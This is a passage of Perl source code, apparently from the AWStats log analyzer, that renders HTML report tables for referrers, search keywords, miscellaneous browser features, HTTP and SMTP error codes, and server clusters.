		print "<td>" . ( $rest_h ? "$p %" : "&nbsp;" ) . "</td>";
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Referrers chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainReferrers{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowOriginStats", 2 ); }
	print "$Center<a name=\"referer\">&nbsp;</a><br />\n";
	my $Totalp = 0;
	foreach ( 0 .. 5 ) {
		$Totalp +=
		  ( $_ != 4 || $IncludeInternalLinksInOriginSection )
		  ? $_from_p[$_]
		  : 0;
	}
	my $Totalh = 0;
	foreach ( 0 .. 5 ) {
		$Totalh +=
		  ( $_ != 4 || $IncludeInternalLinksInOriginSection )
		  ? $_from_h[$_]
		  : 0;
	}

    my $title = "🔗 " . _t("Traffic Sources");

    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=ORIGIN&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        
	&tab_head( $title, 19, 0, 'referer' );
	my @p_p = ( 0, 0, 0, 0, 0, 0 );
	if ( $Totalp > 0 ) {
		$p_p[0] = int( $_from_p[0] / $Totalp * 1000 ) / 10;
		$p_p[1] = int( $_from_p[1] / $Totalp * 1000 ) / 10;
		$p_p[2] = int( $_from_p[2] / $Totalp * 1000 ) / 10;
		$p_p[3] = int( $_from_p[3] / $Totalp * 1000 ) / 10;
		$p_p[4] = int( $_from_p[4] / $Totalp * 1000 ) / 10;
		$p_p[5] = int( $_from_p[5] / $Totalp * 1000 ) / 10;
	}
	my @p_h = ( 0, 0, 0, 0, 0, 0 );
	if ( $Totalh > 0 ) {
		$p_h[0] = int( $_from_h[0] / $Totalh * 1000 ) / 10;
		$p_h[1] = int( $_from_h[1] / $Totalh * 1000 ) / 10;
		$p_h[2] = int( $_from_h[2] / $Totalh * 1000 ) / 10;
		$p_h[3] = int( $_from_h[3] / $Totalh * 1000 ) / 10;
		$p_h[4] = int( $_from_h[4] / $Totalh * 1000 ) / 10;
		$p_h[5] = int( $_from_h[5] / $Totalh * 1000 ) / 10;
	}
	print
	  "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Origin") . "</th>";
	if ( $ShowOriginStats =~ /P/i ) {
		print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	}
	print "</tr>\n";

	#------- Referrals by direct address/bookmark/link in email/etc...
	print "<tr><td class=\"aws\"><b>" . _t("Direct address / Bookmarks") . "</b></td>";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td>"
		  . ( $_from_p[0] ? Format_Number($_from_p[0]) : "&nbsp;" )
		  . "</td><td>"
		  . ( $_from_p[0] ? "$p_p[0] %" : "&nbsp;" ) . "</td>";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td>"
		  . ( $_from_h[0] ? Format_Number($_from_h[0]) : "&nbsp;" )
		  . "</td><td>"
		  . ( $_from_h[0] ? "$p_h[0] %" : "&nbsp;" ) . "</td>";
	}
	print "</tr>\n";

	#------- Referrals by search engines
	print "<tr"
	  . Tooltip(13)
	  . "><td class=\"aws\"><b>" . _t("Search Engines") . "</b> - <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=refererse")
		: "$StaticLinks.refererse.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a><br />\n";
	if ( scalar keys %_se_referrals_h ) {
		print "<table>\n";
		my $total_p = 0;
		my $total_h = 0;
		my $count = 0;
		&BuildKeyList(
			$MaxNbOf{'RefererShown'},
			$MinHit{'Refer'},
			\%_se_referrals_h,
			(
				( scalar keys %_se_referrals_p )
				? \%_se_referrals_p
				: \%_se_referrals_h
			)
		);
		foreach my $key (@keylist) {
			my $newreferer = $SearchEnginesHashLib{$key}
			  || CleanXSS($key);
			print "<tr><td class=\"aws\">- $newreferer</td>";
			print "<td>"
			  . (
				Format_Number($_se_referrals_p{$key} ? $_se_referrals_p{$key} : '0' ))
			  . "</td>";
			print "<td> / ".Format_Number($_se_referrals_h{$key})."</td>";
			print "</tr>\n";
			$total_p += $_se_referrals_p{$key};
			$total_h += $_se_referrals_h{$key};
			$count++;
		}
		if ($Debug) {
			debug(
"Total real / shown : $TotalSearchEnginesPages / $total_p -  $TotalSearchEnginesHits / $total_h",
				2
			);
		}
		my $rest_p = $TotalSearchEnginesPages - $total_p;
		my $rest_h = $TotalSearchEnginesHits - $total_h;
		if ( $rest_p > 0 || $rest_h > 0 ) {
			print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">- " . _t("Others") . "</span></td>";
			print "<td>".Format_Number($rest_p)."</td>";
			print "<td> / ".Format_Number($rest_h)."</td>";
			print "</tr>\n";
		}
		print "</table>";
	}
	print "</td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td valign=\"top\">"
		  . ( $_from_p[2] ? Format_Number($_from_p[2]) : "&nbsp;" )
		  . "</td><td valign=\"top\">"
		  . ( $_from_p[2] ? "$p_p[2] %" : "&nbsp;" ) . "</td>";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td valign=\"top\">"
		  . ( $_from_h[2] ? Format_Number($_from_h[2]) : "&nbsp;" )
		  . "</td><td valign=\"top\">"
		  . ( $_from_h[2] ? "$p_h[2] %" : "&nbsp;" ) . "</td>";
	}
	print "</tr>\n";

	#------- Referrals by external HTML link
	print "<tr"
	  . Tooltip(14)
	  . "><td class=\"aws\"><b>" . _t("External pages") . "</b> - <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'}
		  || !$StaticLinks
		? XMLEncode("$AWScript${NewLinkParams}output=refererpages")
		: "$StaticLinks.refererpages.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a><br />\n";
	if ( scalar keys %_pagesrefs_h ) {
		print "<table>\n";
		my $total_p = 0;
		my $total_h = 0;
		my $count = 0;
		&BuildKeyList(
			$MaxNbOf{'RefererShown'},
			$MinHit{'Refer'},
			\%_pagesrefs_h,
			(
				( scalar keys %_pagesrefs_p )
				? \%_pagesrefs_p
				: \%_pagesrefs_h
			)
		);
		foreach my $key (@keylist) {
			print "<tr><td class=\"aws\">- ";
			&HTMLShowURLInfo($key);
			print "</td>";
			print "<td>"
			  . Format_Number(( $_pagesrefs_p{$key} ? $_pagesrefs_p{$key} : '0' ))
			  . "</td>";
			print "<td>".Format_Number($_pagesrefs_h{$key})."</td>";
			print "</tr>\n";
			$total_p += $_pagesrefs_p{$key};
			$total_h += $_pagesrefs_h{$key};
			$count++;
		}
		if ($Debug) {
			debug(
"Total real / shown : $TotalRefererPages / $total_p - $TotalRefererHits / $total_h",
				2
			);
		}
		my $rest_p = $TotalRefererPages - $total_p;
		my $rest_h = $TotalRefererHits - $total_h;
		if ( $rest_p > 0 || $rest_h > 0 ) {
			print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">- " . _t("Others") . "</span></td>";
			print "<td>".Format_Number($rest_p)."</td>";
			print "<td>".Format_Number($rest_h)."</td>";
			print "</tr>\n";
		}
		print "</table>";
	}
	print "</td>\n";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td valign=\"top\">"
		  . ( $_from_p[3] ? Format_Number($_from_p[3]) : "&nbsp;" )
		  . "</td><td valign=\"top\">"
		  . ( $_from_p[3] ? "$p_p[3] %" : "&nbsp;" ) . "</td>";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td valign=\"top\">"
		  . ( $_from_h[3] ? Format_Number($_from_h[3]) : "&nbsp;" )
		  . "</td><td valign=\"top\">"
		  . ( $_from_h[3] ? "$p_h[3] %" : "&nbsp;" ) . "</td>";
	}
	print "</tr>\n";

	#------- Referrals by internal HTML link
	if ($IncludeInternalLinksInOriginSection) {
		print "<tr><td class=\"aws\"><b>" . _t("Internal pages") . "</b></td>";
		if ( $ShowOriginStats =~ /P/i ) {
			print "<td>"
			  . ( $_from_p[4] ? Format_Number($_from_p[4]) : "&nbsp;" )
			  . "</td><td>"
			  . ( $_from_p[4] ? "$p_p[4] %" : "&nbsp;" ) . "</td>";
		}
		if ( $ShowOriginStats =~ /H/i ) {
			print "<td>"
			  . ( $_from_h[4] ? Format_Number($_from_h[4]) : "&nbsp;" )
			  . "</td><td>"
			  . ( $_from_h[4] ? "$p_h[4] %" : "&nbsp;" ) . "</td>";
		}
		print "</tr>\n";
	}

	#------- Referrals by news group
	#print "<tr><td class=\"aws\"><b>$Message[107]</b></td>";
	#if ($ShowOriginStats =~ /P/i) { print "<td>".($_from_p[5]?$_from_p[5]:"&nbsp;")."</td><td>".($_from_p[5]?"$p_p[5] %":"&nbsp;")."</td>"; }
	#if ($ShowOriginStats =~ /H/i) { print "<td>".($_from_h[5]?$_from_h[5]:"&nbsp;")."</td><td>".($_from_h[5]?"$p_h[5] %":"&nbsp;")."</td>"; }
	#print "</tr>\n";

	#------- Unknown origin
	print "<tr><td class=\"aws\"><b>" . _t("Unknown origin") . "</b></td>";
	if ( $ShowOriginStats =~ /P/i ) {
		print "<td>"
		  . ( $_from_p[1] ? Format_Number($_from_p[1]) : "&nbsp;" )
		  . "</td><td>"
		  . ( $_from_p[1] ? "$p_p[1] %" : "&nbsp;" ) . "</td>";
	}
	if ( $ShowOriginStats =~ /H/i ) {
		print "<td>"
		  . ( $_from_h[1] ? Format_Number($_from_h[1]) : "&nbsp;" )
		  . "</td><td>"
		  . ( $_from_h[1] ? "$p_h[1] %" : "&nbsp;" ) . "</td>";
	}
	print "</tr>\n";
	&tab_end();

	# 0: Direct
	# 1: Unknown
	# 2: SE
	# 3: External link
	# 4: Internal link
	# 5: Newsgroup (deprecated)
}

#------------------------------------------------------------------------------
# Function:     Prints the Key Phrases and Keywords chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainKeys{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($ShowKeyphrasesStats) {
		print "$Center<a name=\"keyphrases\">&nbsp;</a>";
	}
	if ($ShowKeywordsStats) {
		print "$Center<a name=\"keywords\">&nbsp;</a>";
	}
	if ( $ShowKeyphrasesStats || $ShowKeywordsStats ) { print "<br />\n"; }
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print
		  "<table width=\"100%\" cellpadding=\"0\" cellspacing=\"0\"><tr>";
	}
	if ($ShowKeyphrasesStats) {
		
		# By Keyphrases
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "<td width=\"50%\" valign=\"top\">\n";
		}
		if ($Debug) { debug( "ShowKeyphrasesStats", 2 ); }
		&tab_head(
_t("Keyphrases") . " (" . _t("Top") . " $MaxNbOf{'KeyphrasesShown'})<br /><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'}
				  || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=keyphrases")
				: "$StaticLinks.keyphrases.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Full list") . "</a>",
			19,
			( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
			'keyphrases'
		);
		print "<tr bgcolor=\"#$color_TableBGRowTitle\""
		  . Tooltip(15)
		  . "><th>" . Format_Number($TotalDifferentKeyphrases) . " " . _t("Different keyphrases") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
		my $total_s = 0;
		my $count = 0;
		&BuildKeyList( $MaxNbOf{'KeyphrasesShown'},
			$MinHit{'Keyphrase'}, \%_keyphrases, \%_keyphrases );
		foreach my $key (@keylist) {
			my $mot;

  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
			if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
				$mot = CleanXSS(
					DecodeKey_decodeutfkeys(
						$key, $PageCode || 'iso-8859-1'
					)
				);
			}
			else { $mot = CleanXSS( DecodeEncodedString($key) ); }
			my $p;
			if ($TotalKeyphrases) {
				$p =
				  int( $_keyphrases{$key} / $TotalKeyphrases * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\">"
			  . XMLEncode($mot)
			  . "</td><td>$_keyphrases{$key}</td><td>$p %</td></tr>\n";
			$total_s += $_keyphrases{$key};
			$count++;
		}
		if ($Debug) {
			debug( "Total real / shown : $TotalKeyphrases / $total_s", 2 );
		}
		my $rest_s = $TotalKeyphrases - $total_s;
		if ( $rest_s > 0 ) {
			my $p;
			if ($TotalKeyphrases) {
				$p = int( $rest_s / $TotalKeyphrases * 1000 ) / 10;
			}
			print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>$rest_s</td>";
			print "<td>$p&nbsp;%</td></tr>\n";
		}
		&tab_end();
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "</td>\n";
		}
	}
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print "<td> &nbsp; </td>";
	}
	if ($ShowKeywordsStats) {

		# By Keywords
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "<td width=\"50%\" valign=\"top\">\n";
		}
		if ($Debug) { debug( "ShowKeywordsStats", 2 ); }
		&tab_head(
_t("Keywords") . " (" . _t("Top") . " $MaxNbOf{'KeywordsShown'})<br /><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'}
				  || !$StaticLinks
				? XMLEncode("$AWScript${NewLinkParams}output=keywords")
				: "$StaticLinks.keywords.$StaticExt"
			  )
			  . "\"$NewLinkTarget>" . _t("Full list") . "</a>",
			19,
			( $ShowKeyphrasesStats && $ShowKeywordsStats ) ? 95 : 70,
			'keywords'
		);
		print "<tr bgcolor=\"#$color_TableBGRowTitle\""
		  . Tooltip(15)
		  . "><th>" . Format_Number($TotalDifferentKeywords) . " " . _t("Different keywords") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_s\" width=\"80\">" . _t("Percent") . "</th></tr>\n";
		my $total_s = 0;
		my $count = 0;
		&BuildKeyList( $MaxNbOf{'KeywordsShown'},
			$MinHit{'Keyword'}, \%_keywords, \%_keywords );
		foreach my $key (@keylist) {
			my $mot;

  # Convert coded keywords (utf8,...) to be correctly reported in HTML page.
			if ( $PluginsLoaded{'DecodeKey'}{'decodeutfkeys'} ) {
				$mot = CleanXSS(
					DecodeKey_decodeutfkeys(
						$key, $PageCode || 'iso-8859-1'
					)
				);
			}
			else { $mot = CleanXSS( DecodeEncodedString($key) ); }
			my $p;
			if ($TotalKeywords) {
				$p = int( $_keywords{$key} / $TotalKeywords * 1000 ) / 10;
			}
			print "<tr><td class=\"aws\">"
			  . XMLEncode($mot)
			  . "</td><td>$_keywords{$key}</td><td>$p %</td></tr>\n";
			$total_s += $_keywords{$key};
			$count++;
		}
		if ($Debug) {
			debug( "Total real / shown : $TotalKeywords / $total_s", 2 );
		}
		my $rest_s = $TotalKeywords - $total_s;
		if ( $rest_s > 0 ) {
			my $p;
			if ($TotalKeywords) {
				$p = int( $rest_s / $TotalKeywords * 1000 ) / 10;
			}
			print
"<tr><td class=\"aws\"><span style=\"color: #$color_other\">" . _t("Others") . "</span></td><td>$rest_s</td>";
			print "<td>$p %</td></tr>\n";
		}
		&tab_end();
		if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
			print "</td>\n";
		}
	}
	if ( $ShowKeyphrasesStats && $ShowKeywordsStats ) {
		print "</tr></table>\n";
	}
}

#------------------------------------------------------------------------------
# Function:     Prints the miscellaneous table
# Parameters:   -
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainMisc{
	if ($Debug) { debug( "ShowMiscStats", 2 ); }
	print "$Center<a name=\"misc\">&nbsp;</a><br />\n";
	my $title = "📌 " . _t("Other Sources");
	&tab_head( "$title", 19, 0, 'misc' );
	print
	  "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Misc") . "</th>";
	print "<th width=\"100\">&nbsp;</th>";
	print "<th width=\"100\">&nbsp;</th>";
	print "</tr>\n";
	my %label = (
		'AddToFavourites'           => _t("Add to favorites"),
		'JavascriptDisabled'        => _t("JavaScript disabled"),
		'JavaEnabled'               => _t("Java enabled"),
		'DirectorSupport'           => _t("Shockwave Support"),
		'FlashSupport'              => _t("Flash Support"),
		'RealPlayerSupport'         => _t("RealPlayer Support"),
		'QuickTimeSupport'          => _t("QuickTime Support"),
		'WindowsMediaPlayerSupport' => _t("Windows Media Support"),
		'PDFSupport'                => _t("PDF Support")
	);

	foreach my $key (@MiscListOrder) {
		my $mischar = substr( $key, 0, 1 );
		if ( $ShowMiscStats !~ /$mischar/i ) { next; }
		my $total = 0;
		my $p;
		if ( $MiscListCalc{$key} eq 'v' ) { $total = $TotalVisits; }
		if ( $MiscListCalc{$key} eq 'u' ) { $total = $TotalUnique; }
		if ( $MiscListCalc{$key} eq 'hm' ) {
			$total = $_misc_h{'TotalMisc'} || 0;
		}
		if ($total) {
			$p =
			  int( ( $_misc_h{$key} ? $_misc_h{$key} : 0 ) / $total *
				  1000 ) / 10;
		}
		print "<tr>";
		print "<td class=\"aws\">"
		  . ( $PageDir eq 'rtl' ? "<span dir=\"ltr\">" : "" )
		  . $label{$key}
		  . ( $PageDir eq 'rtl' ? "</span>" : "" ) . "</td>";
		if ( $MiscListCalc{$key} eq 'v' ) {
			print "<td>"
			  . Format_Number(( $_misc_h{$key} || 0 ))
			  . " / ".Format_Number($total) . " " . _t("Visits") . "</td>";
		}
		if ( $MiscListCalc{$key} eq 'u' ) {
			print "<td>"
			  . Format_Number(( $_misc_h{$key} || 0 ))
			  . " / ".Format_Number($total) . " " . _t("Unique visitors") . "</td>";
		}
		if ( $MiscListCalc{$key} eq 'hm' ) { print "<td>-</td>"; }
		print "<td>" . ( $total ? "$p %" : "&nbsp;" ) . "</td>";
		print "</tr>\n";
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainHTTPStatus{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowHTTPErrorsStats", 2 ); }
	print "$Center<a name=\"errors\">&nbsp;</a><br />\n";
	my $title = _t("HTTP Error codes");
	
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=ERRORS&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	
	&tab_head( "$title", 19, 0, 'errors' );
	
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );
		
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"5\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"$title",              "httpstatus",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("HTTP Error codes") . "*</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th></tr>\n";
	my $total_h = 0;
	my $count = 0;
	foreach my $key (@keylist) {
		my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
		print "<tr" . Tooltip( $key, $key ) . ">";
		if ( $TrapInfosForHTTPErrorCodes{$key} ) {
			print "<td><a href=\""
			  . (
				$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
				? XMLEncode(
					"$AWScript${NewLinkParams}output=errors$key")
				: "$StaticLinks.errors$key.$StaticExt"
			  )
			  . "\"$NewLinkTarget>$key</a></td>";
		}
		else { print "<td valign=\"top\">$key</td>"; }
		print "<td class=\"aws\">"
		  . (
			$httpcodelib{$key} ? $httpcodelib{$key} : _t("Unknown error") )
		  . "</td><td>".Format_Number($_errors_h{$key})."</td><td>$p %</td><td>"
		  . Format_Bytes( $_errors_k{$key} ) . "</td>";
		print "</tr>\n";
		$total_h += $_errors_h{$key};
		$count++;
	}
	&tab_end("* " . _t("HTTP codes 4xx/5xx do not include errors detected before being sent to user"));
}

#------------------------------------------------------------------------------
# Function:     Prints the Status codes chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainSMTPStatus{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowSMTPErrorsStats", 2 ); }
	print "$Center<a name=\"errors\">&nbsp;</a><br />\n";
	my $title = _t("SMTP Error codes");
	&tab_head( "$title", 19, 0, 'errors' );
	print
"<tr bgcolor=\"#$color_TableBGRowTitle\"><th colspan=\"2\">" . _t("SMTP Error codes") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th></tr>\n";
	my $total_h = 0;
	my $count = 0;
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_errors_h, \%_errors_h );

	foreach my $key (@keylist) {
		my $p = int( $_errors_h{$key} / $TotalHitsErrors * 1000 ) / 10;
		print "<tr" . Tooltip( $key, $key ) . ">";
		print "<td valign=\"top\">$key</td>";
		print "<td class=\"aws\">"
		  . (
			$smtpcodelib{$key} ? $smtpcodelib{$key} : _t("Unknown error") )
		  . "</td><td>".Format_Number($_errors_h{$key})."</td><td>$p %</td><td>"
		  . Format_Bytes( $_errors_k{$key} ) . "</td>";
		print "</tr>\n";
		$total_h += $_errors_h{$key};
		$count++;
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints the cluster information chart and table
# Parameters:   $NewLinkParams, $NewLinkTarget
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainCluster{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	
	if ($Debug) { debug( "ShowClusterStats", 2 ); }
	print "$Center<a name=\"clusters\">&nbsp;</a><br />\n";
	my $title = _t("Clusters");
	
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
       # extend the title to include the added link
           $title .= " &nbsp; - &nbsp; <a href=\"" . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=CLUSTER&baseName=$DirData/$PROG"
           . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
           . "&siteConfig=$SiteConfig" )
           . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
        	
	&tab_head( "$title", 19, 0, 'clusters' );
	
	&BuildKeyList( $MaxRowsInHTMLOutput, 1, \%_cluster_p, \%_cluster_p );
	
	# Graph the top five in a pie chart
	if (scalar @keylist > 1){
		foreach my $pluginname ( keys %{ $PluginsLoaded{'ShowGraph'} } )
		{
			my @blocklabel = ();
			my @valdata = ();
			my @valcolor = ($color_p);
			my $cnt = 0;
			foreach my $key (@keylist) {
				push @valdata, int( $_cluster_p{$key} / $TotalHits * 1000 ) / 10;
				push @blocklabel, "$key";
				$cnt++;
				if ($cnt > 4) { last; }
			}
			print "<tr><td colspan=\"7\">";
			my $function = "ShowGraph_$pluginname";
			&$function(
				"$title",              "cluster",
				0, 						\@blocklabel,
				0,           			\@valcolor,
				0,              		0,
				0,          			\@valdata
			);
			print "</td></tr>";
		}
	}
	
	print
	  "<tr bgcolor=\"#$color_TableBGRowTitle\"><th>" . _t("Clusters") . "</th>";
	&HTMLShowClusterInfo('__title__');
	if ( $ShowClusterStats =~ /P/i ) {
		print
"<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th><th bgcolor=\"#$color_p\" width=\"80\">" . _t("Percent") . "</th>";
	}
	if ( $ShowClusterStats =~ /H/i ) {
		print
"<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th><th bgcolor=\"#$color_h\" width=\"80\">" . _t("Percent") . "</th>";
	}
	if ( $ShowClusterStats =~ /B/i ) {
		print
"<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th><th bgcolor=\"#$color_k\" width=\"80\">" . _t("Percent") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;

# Cluster feature might have been enable in middle of month so we recalculate
# total for cluster section only, to calculate ratio, instead of using global total
	foreach my $key (@keylist) {
		$total_p += int( $_cluster_p{$key} || 0 );
		$total_h += int( $_cluster_h{$key} || 0 );
		$total_k += int( $_cluster_k{$key} || 0 );
	}
	my $count = 0;
	foreach my $key (@keylist) {
		my $p_p = int( $_cluster_p{$key} / $total_p * 1000 ) / 10;
		my $p_h = int( $_cluster_h{$key} / $total_h * 1000 ) / 10;
		my $p_k = int( $_cluster_k{$key} / $total_k * 1000 ) / 10;
		print "<tr>";
		print "<td class=\"aws\">" . _t("Computer") . " $key</td>";
		&HTMLShowClusterInfo($key);
		if ( $ShowClusterStats =~ /P/i ) {
			print "<td>"
			  . ( $_cluster_p{$key} ? Format_Number($_cluster_p{$key}) : "&nbsp;" )
			  . "</td><td>$p_p %</td>";
		}
		if ( $ShowClusterStats =~ /H/i ) {
			print "<td>".Format_Number($_cluster_h{$key})."</td><td>$p_h %</td>";
		}
		if ( $ShowClusterStats =~ /B/i ) {
			print "<td>"
			  . Format_Bytes( $_cluster_k{$key} )
			  . "</td><td>$p_k %</td>";
		}
		print "</tr>\n";
		$count++;
	}
	&tab_end();
}

#------------------------------------------------------------------------------
# Function:     Prints a chart or table for each extra section
# Parameters:   $NewLinkParams, $NewLinkTarget, $extranum
# Input:        -
# Output:       HTML
# Return:       -
#------------------------------------------------------------------------------
sub HTMLMainExtra{
	my $NewLinkParams = shift;
	my $NewLinkTarget = shift;
	my $extranum = shift;
	
	if ($Debug) { debug( "ExtraName$extranum", 2 ); }
	print "$Center<a name=\"extra$extranum\">&nbsp;</a><br />";
	my $title = $ExtraName[$extranum];
	&tab_head( "$title", 19, 0, "extra$extranum" );
	print "<tr bgcolor=\"#$color_TableBGRowTitle\">";
	print "<th>" . $ExtraFirstColumnTitle[$extranum];
	print "&nbsp; - &nbsp; <a href=\""
	  . (
		$ENV{'GATEWAY_INTERFACE'} || !$StaticLinks
		? XMLEncode(
			"$AWScript${NewLinkParams}output=allextra$extranum")
		: "$StaticLinks.allextra$extranum.$StaticExt"
	  )
	  . "\"$NewLinkTarget>" . _t("Full list") . "</a>";
	  
    if ( $AddLinkToExternalCGIWrapper && ($ENV{'GATEWAY_INTERFACE'} || !$StaticLinks) ) {
        print "&nbsp; - &nbsp; <a href=\""
          . (XMLEncode(
               "$AddLinkToExternalCGIWrapper" . "?section=EXTRA_$extranum&baseName=$DirData/$PROG"
            . "&month=$MonthRequired&year=$YearRequired&day=$DayRequired"
            . "&sectionTitle=$ExtraName[$extranum]&siteConfig=$SiteConfig" )
            . "\"$NewLinkTarget>" . _t("Export") . "</a>");
    }
  
	print "</th>";

	if ( $ExtraStatTypes[$extranum] =~ m/P/i ) {
		print
		  "<th bgcolor=\"#$color_p\" width=\"80\">" . _t("Pages") . "</th>";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/H/i ) {
		print
		  "<th bgcolor=\"#$color_h\" width=\"80\">" . _t("Hits") . "</th>";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/B/i ) {
		print
		  "<th bgcolor=\"#$color_k\" width=\"80\">" . _t("Bandwidth") . "</th>";
	}
	if ( $ExtraStatTypes[$extranum] =~ m/L/i ) {
		print "<th width=\"120\">" . _t("Last visit") . "</th>";
	}
	print "</tr>\n";
	my $total_p = my $total_h = my $total_k = 0;

	 #$max_h=1; foreach (values %_login_h) { if ($_ > $max_h) { $max_h = $_; } }
	 #$max_k=1; foreach (values %_login_k) { if ($_ > $max_k) { $max_k = $_; } }
	my $count = 0;
	if ( $MaxNbOfExtra[$extranum] ) {
